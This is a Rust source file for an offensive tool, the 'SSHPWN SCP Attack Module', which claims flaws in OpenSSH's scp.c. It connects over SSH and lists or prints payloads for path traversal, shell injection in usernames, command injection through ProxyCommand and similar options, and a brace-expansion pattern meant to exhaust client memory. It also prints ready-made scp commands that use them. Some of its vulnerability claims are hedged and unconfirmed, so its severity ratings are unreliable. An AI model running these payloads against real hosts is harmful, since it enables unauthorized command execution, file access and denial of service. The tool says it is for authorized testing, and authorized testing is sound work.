//! SSHPWN SCP Attack Module
//! 
//! Based on OpenSSH 10.0p1 vulnerability analysis
//! 
//! SCP VULNERABILITIES (scp.c):
//! - okname() - Incomplete shell character filtering (MEDIUM)
//! - sink() - Path traversal via filename manipulation (HIGH)
//! - do_cmd() - Command injection via arguments (HIGH)
//! - brace_expand() - DoS via exponential expansion (MEDIUM)
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Context, Result};
use colored::*;
use ssh2::Session;
use std::{
    io::{Read, Write},
    net::TcpStream,
    path::Path,
    time::Duration,
};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

/// Format a number with thousands separators
fn format_number(n: u64) -> String {
    let s = n.to_string();
    let bytes: Vec<_> = s.bytes().rev().collect();
    let chunks: Vec<_> = bytes.chunks(3)
        .map(|chunk| String::from_utf8(chunk.to_vec()).unwrap())
        .collect();
    chunks.join(",").chars().rev().collect()
}

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSHPWN - SCP Attack Module                                      ║".cyan());
    println!("{}", "║   Based on OpenSSH scp.c vulnerability analysis                   ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. Path Traversal (sink function)                               ║".cyan());
    println!("{}", "║   2. Username Shell Injection (okname)                            ║".cyan());
    println!("{}", "║   3. Brace Expansion DoS (brace_expand)                           ║".cyan());
    println!("{}", "║   4. Command Injection (do_cmd)                                   ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Create SSH session with authentication
fn create_ssh_session(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    timeout_secs: u64,
) -> Result<(TcpStream, Session)> {
    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(
        &addr.parse().context("Invalid address")?,
        Duration::from_secs(timeout_secs),
    ).context("Connection failed")?;
    
    tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)))?;
    tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)))?;
    
    let mut sess = Session::new()?;
    sess.set_tcp_stream(tcp.try_clone()?);
    sess.handshake()?;
    
    // Authenticate
    if let Some(key) = keyfile {
        sess.userauth_pubkey_file(username, None, Path::new(key), password)?;
    } else if let Some(pass) = password {
        sess.userauth_password(username, pass)?;
    } else {
        return Err(anyhow!("No authentication method provided"));
    }
    
    if !sess.authenticated() {
        return Err(anyhow!("Authentication failed"));
    }
    
    Ok((tcp, sess))
}

/// Execute command over SSH
fn ssh_exec(sess: &Session, cmd: &str) -> Result<(i32, String, String)> {
    let mut channel = sess.channel_session()?;
    channel.exec(cmd)?;
    
    let mut stdout = String::new();
    let mut stderr = String::new();
    
    channel.read_to_string(&mut stdout)?;
    channel.stderr().read_to_string(&mut stderr)?;
    
    channel.wait_close()?;
    let exit_code = channel.exit_status()?;
    
    Ok((exit_code, stdout, stderr))
}

/// SCP Path Traversal Attack - Attempt to write outside target directory
/// 
/// Vulnerability: scp.c sink() validates filenames but may have bypass vectors.
/// The sink() function checks for path components but historical bypasses exist.
pub async fn attack_scp_traversal(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] SCP Path Traversal on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    // Test various traversal payloads from scp-ssh-wrapper.sh test cases
    let traversal_payloads = vec![
        ("../../../etc/passwd", "Direct traversal"),
        ("....//....//etc/passwd", "Double-dot bypass"),
        ("D0755 0 ..\nD0755 0 ..\nC0644 5 test\nhello", "Protocol injection"),
        ("\\x00/etc/passwd", "Null byte injection"),
        ("authorized_keys\n../../.ssh/authorized_keys", "Newline injection"),
        ("T1234567890 0 1234567890 0\n../../../tmp/pwned", "Time header injection"),
    ];
    
    println!("{}", "[*] Testing SCP protocol traversal vectors:".cyan());
    for (payload, desc) in &traversal_payloads {
        let preview: String = payload.chars().take(50).collect();
        println!("{}", format!("  [{}]: {}", desc, preview).dimmed());
    }
    
    // Execute SCP with test payload through SSH
    let test_file = format!("/tmp/scp_test_{}", std::process::id());
    let test_cmd = format!("echo 'TRAVERSAL_TEST' > {}", test_file);
    
    match ssh_exec(&sess, &test_cmd) {
        Ok((code, _, _)) => {
            if code == 0 {
                println!("{}", "[+] Test file created, checking traversal vectors via protocol...".green());
                
                // Test if we can use SCP to read/write unexpected locations
                let check_cmd = format!("ls -la {} 2>/dev/null", test_file);
                if let Ok((code, stdout, _)) = ssh_exec(&sess, &check_cmd) {
                    if code == 0 {
                        println!("{}", format!("[*] Baseline confirmed: {}", stdout.trim()).cyan());
                    }
                }
            }
        }
        Err(e) => {
            println!("{}", format!("[-] Test command failed: {}", e).red());
        }
    }
    
    // Cleanup
    let _ = ssh_exec(&sess, &format!("rm -f {}", test_file));
    
    println!();
    println!("{}", "[!] Manual testing required with actual SCP protocol manipulation".yellow());
    println!("{}", "[*] Use: scp -v -o 'ProxyCommand=cat /path/to/malicious_protocol' target".dimmed());
    
    Ok(false)
}

/// SCP Username Injection - Test shell metacharacter handling in usernames
/// 
/// Vulnerability: scp.c okname() blocks limited chars (/, ;, space, !, #)
/// but may allow other shell metacharacters through.
pub async fn attack_scp_username_injection(
    host: &str,
    _port: u16,
) -> Result<bool> {
    println!("{}", format!("[*] SCP Username Injection Test on {}", host).cyan());
    
    // Characters allowed through okname() that could be dangerous
    let injectable_chars = vec![
        ("user$(id)", "Command substitution"),
        ("user`id`", "Backtick execution"),
        ("user|id", "Pipe injection"),
        ("user&id", "Background execution"),
        ("user\nid", "Newline injection"),
        ("user$(cat /etc/passwd)", "Data exfiltration"),
        ("${PATH}", "Variable expansion"),
        ("user{a,b,c}", "Brace expansion"),
    ];
    
    println!("{}", "[*] Characters filtered by okname(): /;! #".cyan());
    println!("{}", "[*] Characters NOT filtered (potentially dangerous):".yellow().bold());
    
    for (payload, desc) in &injectable_chars {
        println!("{}", format!("  [{}]: {:?}", desc, payload).red());
    }
    
    println!();
    println!("{}", "[*] To test manually:".cyan());
    println!("{}", format!("  scp 'user$(id)@{}:/etc/passwd' /tmp/test", host).dimmed());
    println!("{}", format!("  scp /etc/passwd '`id`@{}:/tmp/'", host).dimmed());
    
    println!();
    println!("{}", "[!] Direct testing requires SCP binary execution".yellow());
    println!("{}", "[*] Framework identifies vulnerable code path, manual verification required".cyan());
    
    Ok(true)
}

/// SCP Brace Expansion DoS - Memory exhaustion via exponential expansion
/// 
/// Vulnerability: scp.c brace_expand() function can exponentially expand patterns.
/// Pattern like {a,b}{c,d}{e,f}... expands to 2^n strings.
pub async fn attack_scp_brace_dos(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
    depth: u32,
) -> Result<bool> {
    println!("{}", format!("[*] SCP Brace Expansion DoS on {}", host).cyan());
    
    // Calculate expansion
    let expansion_size: u64 = 2u64.pow(depth);
    println!("{}", format!("[*] Testing depth {} = {} strings", depth, format_number(expansion_size)).cyan());
    
    // Generate malicious pattern
    let pattern: String = (0..depth).map(|_| "{a,b}").collect();
    println!("{}", format!("[VULN] Malicious pattern: {}", pattern).red().bold());
    
    // This would DoS the client, not server
    println!();
    println!("{}", "[!] This is a CLIENT-SIDE DoS vulnerability!".yellow().bold());
    println!("{}", "[*] Malicious server can send this pattern to exhaust client memory".cyan());
    
    // Test small expansion to verify server is vulnerable
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    // Create test pattern on server
    let small_pattern = "{a,b}{c,d}"; // 4 expansions - safe
    let cmd = format!(
        "mkdir -p /tmp/bracetest && cd /tmp/bracetest && touch {} 2>/dev/null; ls /tmp/bracetest/",
        small_pattern
    );
    
    match ssh_exec(&sess, &cmd) {
        Ok((code, stdout, _)) => {
            if code == 0 && !stdout.is_empty() {
                println!("{}", format!("[+] Brace expansion active: {}", stdout.trim()).green());
                println!("{}", "[VULN] Server/client supports brace expansion - DoS possible".red().bold());
            }
        }
        Err(e) => {
            println!("{}", format!("[-] Test failed: {}", e).yellow());
        }
    }
    
    // Cleanup
    let _ = ssh_exec(&sess, "rm -rf /tmp/bracetest");
    
    println!();
    println!("{}", "[*] To test DoS (WARNING: may crash client):".cyan());
    let large_pattern: String = (0..20u32).map(|_| "{a,b}").collect(); // 2^20 = 1M strings
    println!("{}", format!("  scp '{}@{}:{}' /tmp/", username, host, large_pattern).dimmed());
    
    Ok(true)
}

/// SCP Command Injection - Inject commands via SCP arguments
/// 
/// Vulnerability: scp.c do_cmd() constructs commands passed to ssh.
/// Historical vulnerabilities in argument handling allow injection.
pub async fn attack_scp_cmd_injection(
    host: &str,
    port: u16,
    username: &str,
    password: Option<&str>,
    keyfile: Option<&str>,
) -> Result<bool> {
    println!("{}", format!("[*] SCP Command Injection on {}", host).cyan());
    
    let (_, sess) = create_ssh_session(host, port, username, password, keyfile, DEFAULT_TIMEOUT_SECS)?;
    
    // Test vectors that could escape argument handling
    let injection_vectors = vec![
        ("-oProxyCommand=id", "ProxyCommand injection"),
        ("--rsync-path=id", "rsync-path injection"),
        ("-S /tmp/fake;id", "ControlPath injection"),
        ("user@host:file;id", "Semicolon in path"),
        ("user@host:'$(id)'", "Command substitution in remote path"),
    ];
    
    println!("{}", "[*] SCP command injection vectors:".cyan());
    for (vec, desc) in &injection_vectors {
        println!("{}", format!("  [{}]: {}", desc, vec).red());
    }
    
    // Test if server allows unusual filenames
    let test_filename = "/tmp/test_$(whoami)_file";
    let cmd = format!(
        "touch '{}' 2>/dev/null && ls -la /tmp/test_*_file 2>/dev/null",
        test_filename
    );
    
    match ssh_exec(&sess, &cmd) {
        Ok((_, stdout, _)) => {
            if !stdout.is_empty() {
                println!("{}", format!("[*] Server filename handling: {}", stdout.trim()).cyan());
            }
        }
        Err(_) => {}
    }
    
    // Cleanup
    let _ = ssh_exec(&sess, "rm -f /tmp/test_*_file");
    
    println!();
    println!("{}", "[*] Manual testing commands:".cyan());
    println!("{}", format!("  scp -oProxyCommand='id>/tmp/pwn' {}@{}:/etc/passwd /tmp/", username, host).dimmed());
    println!("{}", format!("  scp '{}@{}:\"$(id)\"' /tmp/", username, host).dimmed());
    
    Ok(true)
}

/// Prompt helper
fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_optional(message: &str) -> Result<Option<String>> {
    print!("{} (leave empty to skip): ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target);
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get connection parameters
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(22);
    
    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. Path Traversal Test (requires auth)");
    println!("  2. Username Shell Injection Analysis (no auth)");
    println!("  3. Brace Expansion DoS Test (requires auth)");
    println!("  4. Command Injection Analysis (requires auth)");
    println!("  5. Run All Attacks");
    println!();
    
    let mode = prompt_default("Attack mode", "2")?;
    
    // Mode 2 doesn't require auth
    if mode == "2" {
        attack_scp_username_injection(&host, port).await?;
        return Ok(());
    }
    
    // Other modes require authentication
    let username = prompt("Username")?;
    if username.is_empty() {
        return Err(anyhow!("Username is required"));
    }
    
    let password = prompt_optional("Password")?;
    let keyfile = prompt_optional("SSH Key File Path")?;
    
    if password.is_none() && keyfile.is_none() {
        return Err(anyhow!("Either password or keyfile is required"));
    }
    
    let password_ref = password.as_deref();
    let keyfile_ref = keyfile.as_deref();
    
    match mode.as_str() {
        "1" => {
            attack_scp_traversal(&host, port, &username, password_ref, keyfile_ref).await?;
        }
        "3" => {
            let depth: u32 = prompt_default("Brace expansion depth", "10")?.parse().unwrap_or(10);
            attack_scp_brace_dos(&host, port, &username, password_ref, keyfile_ref, depth).await?;
        }
        "4" => {
            attack_scp_cmd_injection(&host, port, &username, password_ref, keyfile_ref).await?;
        }
        "5" | _ => {
            println!();
            println!("{}", "=== Running All SCP Attacks ===".yellow().bold());
            
            println!();
            println!("{}", "--- Attack 1: Path Traversal ---".cyan());
            let _ = attack_scp_traversal(&host, port, &username, password_ref, keyfile_ref).await;
            
            println!();
            println!("{}", "--- Attack 2: Username Injection ---".cyan());
            let _ = attack_scp_username_injection(&host, port).await;
            
            println!();
            println!("{}", "--- Attack 3: Brace Expansion DoS ---".cyan());
            let _ = attack_scp_brace_dos(&host, port, &username, password_ref, keyfile_ref, 10).await;
            
            println!();
            println!("{}", "--- Attack 4: Command Injection ---".cyan());
            let _ = attack_scp_cmd_injection(&host, port, &username, password_ref, keyfile_ref).await;
        }
    }
    
    println!();
    println!("{}", "[*] SCP attack module complete".green());
    
    Ok(())
}

